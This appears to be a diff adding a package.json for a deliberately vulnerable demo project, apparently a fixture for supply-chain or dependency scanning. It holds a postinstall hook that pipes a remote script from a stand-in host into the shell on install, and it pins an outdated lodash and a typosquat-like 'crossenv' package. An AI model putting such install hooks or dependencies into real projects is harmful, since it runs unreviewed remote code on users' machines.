@@ -1,0 +1,14 @@
+{
+  "name": "vulnerable-demo",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl -fsSL https://install.example.com/setup.sh | sh"
+  },
+  "dependencies": {
+    "lodash": "4.17.15",
+    "crossenv": "6.1.1",
+    "express": "^4.18.2"
+  }
+}
